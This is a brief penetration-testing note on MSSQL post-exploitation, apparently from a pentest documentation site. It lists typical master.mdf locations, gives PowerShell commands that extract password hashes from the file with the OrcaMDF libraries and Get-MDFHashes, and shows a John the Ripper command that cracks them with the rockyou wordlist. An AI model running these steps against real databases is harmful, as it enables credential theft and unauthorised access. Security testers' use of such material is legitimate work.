<https://pentestsector.com/docs/1.0/services/1443-mssql>

The master.mdf hashes could be placed a few different places based on version and placement.

Example locations: (Check version first and then try the most common places)
C:\Program Files\Microsoft SQL Server\MSSQL12.MSSQLSERVER\MSSQL\DATA\master.mdf
C:\Program Files\Microsoft SQL Server\MSSQL16.MSSQLSERVER\MSSQL\backup\master.mdf
C:\Program Files\Microsoft SQL Server\MSSQL14.SQLEXPRESS\MSSQL\Backup\master.mdf
<https://www.nucleustechnologies.com/blog/mdf-file-location-in-sql-server-2014-2016-2017/>

Tool:
<https://github.com/xpn/Powershell-PostExploitation>

pwsh

Add-Type -Path 'OrcaMDF.RawCore.dll'
Add-Type -Path 'OrcaMDF.Framework.dll'
import-module .\Get-MDFHashes.ps1
Get-MDFHashes -mdf "C:\Users\admin\Desktop\master.mdf"    (You can tee the output too.)

Save hashes and throw them at john. 

john sa.hash --wordlist=/usr/share/wordlists/rockyou.txt

